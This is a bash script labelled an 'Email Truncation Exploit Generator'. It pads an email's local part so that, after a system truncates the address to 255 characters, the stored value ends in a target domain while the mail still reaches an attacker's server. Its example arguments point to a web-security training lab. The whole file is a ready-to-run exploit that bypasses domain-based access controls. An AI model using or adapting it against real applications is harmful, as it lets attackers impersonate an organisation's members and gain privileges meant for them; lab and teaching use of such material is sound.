#!/bin/bash

# Function to generate random characters
randomchar() {
  < /dev/urandom tr -dc 'A-Za-z0-9' | head -c "$1"
  echo
}

# Check if correct arguments are provided
if [ "$#" -ne 2 ]; then
  echo "Usage: $0 <target_domain> <your_email_server>"
  echo "Example: $0 dontwannacry.com exploit-abc123.exploit-server.net"
  exit 1
fi

TARGET_DOMAIN="$1"
YOUR_EMAIL_SERVER="$2"

# Calculate the required padding length
# We need the last character of TARGET_DOMAIN to be at position 255
# Formula: 255 - (length of "@" + TARGET_DOMAIN)
DOMAIN_LENGTH=${#TARGET_DOMAIN}
AT_SYMBOL_LENGTH=1
PADDING_LENGTH=$((255 - DOMAIN_LENGTH - AT_SYMBOL_LENGTH))

# Generate the padding string
PADDING=$(randomchar $PADDING_LENGTH)

# Construct the final email
EXPLOIT_EMAIL="${PADDING}@${TARGET_DOMAIN}.${YOUR_EMAIL_SERVER}"

# Verify the length calculations
CRITICAL_PART="${PADDING}@${TARGET_DOMAIN}"
CRITICAL_LENGTH=${#CRITICAL_PART}

echo "=== Email Truncation Exploit Generator ==="
echo "Target domain: $TARGET_DOMAIN"
echo "Your email server: $YOUR_EMAIL_SERVER"
echo "Padding length: $PADDING_LENGTH characters"
echo "Character at position 255: ${CRITICAL_PART:254:1}"
echo "Critical part length: $CRITICAL_LENGTH characters"
echo ""
echo "Generated exploit email:"
echo "$EXPLOIT_EMAIL"
echo ""
echo "Truncated result (what the system will store):"
echo "${CRITICAL_PART:0:255}"

